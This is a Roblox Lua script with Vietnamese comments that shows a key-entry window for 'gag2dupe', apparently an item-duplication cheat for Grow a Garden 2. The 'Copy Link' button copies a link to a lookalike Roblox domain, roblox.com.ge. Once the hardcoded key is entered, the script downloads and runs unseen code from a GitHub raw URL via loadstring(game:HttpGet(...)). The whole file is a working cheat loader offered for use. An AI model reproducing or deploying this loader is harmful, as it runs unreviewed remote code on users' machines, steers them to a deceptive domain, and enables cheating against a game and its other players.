--[[
    SCRIPT CHUẨN: gag2dupe (Grow a Garden 2)
    Đã sửa lỗi bị đè lệnh loadstring ở đầu.
--]]

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Clipboard = setclipboard or toclipboard

-- ==================== CẤU HÌNH HỆ THỐNG KEY ====================
local LINK_GET_KEY = "https://roblox.com.ge/communities/8754684311/" 
local KEY_CHINH_XAC = "Key_gag2" 

-- Link script chính trên GitHub của bạn:
local LINK_SCRIPT_CHINH = "https://raw.githubusercontent.com/hoangvip397-coder/Tu-n-ngu/refs/heads/main/Scriptdemo.lua.txt" 
-- ===============================================================

-- Khởi tạo Giao diện (UI)
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "gag2dupe_KeySystem"
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

-- Ép bảng hiện lên CoreGui để chống lỗi chặn UI của các Executor
local successGui, errGui = pcall(function()
    ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
end)
if not successGui then
    ScreenGui.Parent = game:GetService("CoreGui")
end

-- Khung bảng chính
local Frame = Instance.new("Frame")
Frame.Name = "MainFrame"
Frame.Size = UDim2.new(0, 360, 0, 220)
Frame.Position = UDim2.new(0.5, -180, 0.5, -110)
Frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25) 
Frame.BorderSizePixel = 0
Frame.Active = true
Frame.Draggable = true
Frame.Parent = ScreenGui

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 12)
UICorner.Parent = Frame

-- Tiêu đề bảng
local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 45)
Title.BackgroundTransparency = 1
Title.Text = "✨ gag2dupe | GROW A GARDEN 2 ✨"
Title.TextColor3 = Color3.fromRGB(46, 204, 113) 
Title.TextSize = 18
Title.Font = Enum.Font.SourceSansBold
Title.Parent = Frame

-- Ô nhập Key
local TextBox = Instance.new("TextBox")
TextBox.Size = UDim2.new(0.85, 0, 0, 38)
TextBox.Position = UDim2.new(0.075, 0, 0.3, 0)
TextBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
TextBox.PlaceholderText = "Nhập hoặc dán Key tại đây..."
TextBox.Text = ""
TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
TextBox.TextSize = 15
TextBox.Font = Enum.Font.SourceSans
TextBox.Parent = Frame

local TextBoxCorner = Instance.new("UICorner")
TextBoxCorner.CornerRadius = UDim.new(0, 6)
TextBoxCorner.Parent = TextBox

-- Nút Copy Link
local CopyBtn = Instance.new("TextButton")
CopyBtn.Size = UDim2.new(0.4, 0, 0, 38)
CopyBtn.Position = UDim2.new(0.075, 0, 0.58, 0)
CopyBtn.BackgroundColor3 = Color3.fromRGB(0, 120, 215)
CopyBtn.Text = "🔗 Copy Link"
CopyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
CopyBtn.TextSize = 14
CopyBtn.Font = Enum.Font.SourceSansBold
CopyBtn.Parent = Frame

local CopyCorner = Instance.new("UICorner")
CopyCorner.CornerRadius = UDim.new(0, 6)
CopyCorner.Parent = CopyBtn

-- Nút Check Key
local CheckBtn = Instance.new("TextButton")
CheckBtn.Size = UDim2.new(0.4, 0, 0, 38)
CheckBtn.Position = UDim2.new(0.525, 0, 0.58, 0)
CheckBtn.BackgroundColor3 = Color3.fromRGB(46, 204, 113)
CheckBtn.Text = "✔️ Check Key"
CheckBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
CheckBtn.TextSize = 14
CheckBtn.Font = Enum.Font.SourceSansBold
CheckBtn.Parent = Frame

local CheckCorner = Instance.new("UICorner")
CheckCorner.CornerRadius = UDim.new(0, 6)
CheckCorner.Parent = CheckBtn

-- Dòng trạng thái
local StatusLabel = Instance.new("TextLabel")
StatusLabel.Size = UDim2.new(1, 0, 0, 30)
StatusLabel.Position = UDim2.new(0, 0, 0.82, 0)
StatusLabel.BackgroundTransparency = 1
StatusLabel.Text = "Hãy vượt link để lấy key sử dụng bản dupe!"
StatusLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
StatusLabel.TextSize = 13
StatusLabel.Font = Enum.Font.SourceSansItalic
StatusLabel.Parent = Frame

-- LOGIC NÚT COPY LINK
CopyBtn.MouseButton1Click:Connect(function()
    if Clipboard then
        Clipboard(LINK_GET_KEY)
        CopyBtn.Text = "Đã sao chép!"
        StatusLabel.TextColor3 = Color3.fromRGB(52, 152, 219)
        StatusLabel.Text = "Đã lưu link! Hãy dán (Paste) vào trình duyệt web."
        task.wait(2)
        CopyBtn.Text = "🔗 Copy Link"
    else
        StatusLabel.TextColor3 = Color3.fromRGB(230, 126, 34)
        StatusLabel.Text = "Lỗi: Executor không hỗ trợ Auto-Copy!"
    end
end)

-- LOGIC NÚT CHECK KEY
CheckBtn.MouseButton1Click:Connect(function()
    local userKey = TextBox.Text
    
    if userKey == KEY_CHINH_XAC then
        StatusLabel.TextColor3 = Color3.fromRGB(46, 204, 113)
        StatusLabel.Text = "Key chuẩn! Đang kích hoạt gag2dupe..."
        task.wait(1.5)
        
        ScreenGui:Destroy() -- Xóa bảng Key
        
        -- CHẠY SCRIPT CHÍNH TỪ FILE GITHUB CỦA BẠN
        local success, err = pcall(function()
            loadstring(game:HttpGet(LINK_SCRIPT_CHINH, true))()
        end)
        
        if not success then
            -- Nếu script trên GitHub bị lỗi code, nó sẽ hiện thông báo lỗi thẳng lên màn hình
            local ErrorGui = Instance.new("ScreenGui")
            ErrorGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
            local Message = Instance.new("Message")
            Message.Text = "Lỗi chạy code từ GitHub: " .. tostring(err)
            Message.Parent = ErrorGui
        end
    else
        StatusLabel.TextColor3 = Color3.fromRGB(231, 76, 60)
        StatusLabel.Text = "Sai Key rồi bạn ơi! Vui lòng kiểm tra lại."
    end
end)
